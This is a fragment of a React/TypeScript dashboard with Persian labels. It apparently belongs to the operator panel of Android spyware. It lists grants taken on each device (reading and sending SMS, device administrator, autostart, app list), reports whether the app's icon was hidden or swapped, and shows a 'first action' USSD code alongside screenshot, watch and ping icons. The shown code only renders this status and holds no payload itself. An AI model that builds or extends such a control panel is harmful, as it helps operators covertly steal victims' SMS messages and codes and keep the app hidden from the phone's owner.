    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M5.5 12.5 10 17l8.5-9" stroke="currentColor" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function CloseGlyph() {
  return (
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M7 7l10 10M17 7 7 17" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" />
    </svg>
  );
}

function WatchGlyph() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M2.5 12S6 6.5 12 6.5 21.5 12 21.5 12 18 17.5 12 17.5 2.5 12 2.5 12Z" stroke="currentColor" strokeWidth="1.7" />
      <circle cx="12" cy="12" r="2.2" stroke="currentColor" strokeWidth="1.7" />
    </svg>
  );
}

function UssdGlyph() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M8 5h8M6 9h12M8 13h8M10 17h4" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" />
      <path d="M5 5v14h14V5H5Z" stroke="currentColor" strokeWidth="1.7" strokeLinejoin="round" />
    </svg>
  );
}

function AppsGlyph() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <rect x="4" y="4" width="6.5" height="6.5" rx="1.6" stroke="currentColor" strokeWidth="1.7" />
      <rect x="13.5" y="4" width="6.5" height="6.5" rx="1.6" stroke="currentColor" strokeWidth="1.7" />
      <rect x="4" y="13.5" width="6.5" height="6.5" rx="1.6" stroke="currentColor" strokeWidth="1.7" />
      <rect x="13.5" y="13.5" width="6.5" height="6.5" rx="1.6" stroke="currentColor" strokeWidth="1.7" />
    </svg>
  );
}

function SmsGlyph() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path
        d="M5.5 5.5h13A1.5 1.5 0 0 1 20 7v8.5a1.5 1.5 0 0 1-1.5 1.5H10l-3.5 3v-3H5.5A1.5 1.5 0 0 1 4 15.5V7A1.5 1.5 0 0 1 5.5 5.5Z"
        stroke="currentColor"
        strokeWidth="1.7"
        strokeLinejoin="round"
      />
      <path d="M8 10h8M8 13h5" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" />
    </svg>
  );
}

function ScreenshotGlyph() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <rect x="4" y="6" width="16" height="12" rx="2" stroke="currentColor" strokeWidth="1.7" />
      <circle cx="12" cy="12" r="3.2" stroke="currentColor" strokeWidth="1.7" />
      <path d="M8 6V5.5A1.5 1.5 0 0 1 9.5 4h5A1.5 1.5 0 0 1 16 5.5V6" stroke="currentColor" strokeWidth="1.7" />
    </svg>
  );
}

function PingGlyph() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <circle cx="12" cy="12" r="2.2" fill="currentColor" />
      <path d="M7.5 7.5a6.4 6.4 0 0 1 9 0M5 5a10 10 0 0 1 14 0" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" />
      <path d="M16.5 16.5a6.4 6.4 0 0 1-9 0M19 19a10 10 0 0 1-14 0" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" />
    </svg>
  );
}

function IconNormalGlyph() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <rect x="5" y="4" width="14" height="16" rx="2.5" stroke="currentColor" strokeWidth="1.7" />
      <circle cx="12" cy="17" r="1.2" fill="currentColor" />
    </svg>
  );
}

function IconHiddenGlyph() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M3 12s3.5-6 9-6 9 6 9 6-3.5 6-9 6-9-6-9-6Z" stroke="currentColor" strokeWidth="1.7" />
      <circle cx="12" cy="12" r="2.4" stroke="currentColor" strokeWidth="1.7" />
      <path d="M4 4l16 16" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" />
    </svg>
  );
}

function IconSwapGlyph() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M7 7h11M15 4l3 3-3 3" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round" />
      <path d="M17 17H6M9 14l-3 3 3 3" stroke="currentColor" strokeWidth="1.7" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

const GRANT_LABELS: Record<string, string> = {
  setup: "فعال‌سازی",
  notifications: "اعلان",
  "sms.read": "خواندن پیامک",
  "sms.receive": "دریافت پیامک",
  "sms.send": "ارسال پیامک",
  "sms.mms": "MMS",
  "sms.wap": "WAP",
  sms: "پیامک",
  battery: "باتری",
  alarm: "هشدار دقیق",
  autostart: "راه‌اندازی خودکار",
  call: "تماس",
  phone: "وضعیت سیم",
  apps: "فهرست برنامه‌ها",
  admin: "سرپرست دستگاه",
};

function grantItems(grants?: string[]): { key: string; label: string }[] {
  if (!grants?.length) return [];
  return grants
    .map((key) => ({ key, label: GRANT_LABELS[key] || "" }))
    .filter((item) => item.label);
}

async function copyPlainText(text: string): Promise<boolean> {
  try {
    await navigator.clipboard.writeText(text);
    return true;
  } catch {
    try {
      const area = document.createElement("textarea");
      area.value = text;
      area.setAttribute("readonly", "");
      area.style.position = "fixed";
      area.style.inset = "0";
      area.style.opacity = "0";
      document.body.appendChild(area);
      area.focus();
      area.select();
      const ok = document.execCommand("copy");
      area.remove();
      return ok;
    } catch {
      return false;
    }
  }
}

function firstActionView(device: Device): { visible: boolean; icon: string; code: string; text: string } {
  const kind = device.firstActionKind || "";
  const icon =
    kind === "icon" || kind === "both"
      ? device.firstActionDetail === "hidden"
        ? "آیکن مخفی شد"
        : device.firstActionDetail === "changed"
          ? "آیکن عوض شد"
          : ""
      : "";
  const code = device.firstActionUssd || (kind === "ussd" ? device.firstActionDetail || "" : "");
  const text = kind === "ussd" || kind === "both" ? device.firstActionText || "" : "";
  return { visible: Boolean(icon || code || text), icon, code, text };
}

function FirstActionCard({
  device,
  copied,
  onCopy,
}: {
  device: Device;
  copied: boolean;
  onCopy: () => void;
}) {
  const view = firstActionView(device);
  if (!view.visible) return null;
  return (
    <div>
      <p className="md-inset__label">اولین کار</p>
      {view.icon ? <p className="md-answer">{view.icon}</p> : null}
      {view.code ? (
        <p className="md-answer" dir="ltr">
          {view.code}
        </p>
      ) : null}
      {view.text ? (
        <div className="md-code-card">
          <p className="md-answer" dir="auto">
            {view.text}
          </p>
          <button type="button" className="md-copy" onClick={onCopy}>
            {copied ? "کپی شد" : "کپی"}
          </button>
        </div>
      ) : null}
    </div>
  );
}

function screenLabel(screen: { on: boolean; locked: boolean }): string {
  if (!screen.on) return "خاموش";
  return screen.locked ? "قفل" : "باز";
}

function iconStateLabel(state?: string): string {
  switch (state) {
    case "hidden":
      return "مخفی";
    case "changed":
      return "عوض‌شده";
    case "normal":
      return "معمولی";
    default:
      return "";
  }
}

function CopyIcon() {
  return (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <rect x="8" y="8" width="11" height="11" rx="2" stroke="currentColor" strokeWidth="1.8" />
      <path d="M6 16.5H5.5A1.5 1.5 0 0 1 4 15V5.5A1.5 1.5 0 0 1 5.5 4H15a1.5 1.5 0 0 1 1.5 1.5V6" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" />
    </svg>
  );
}
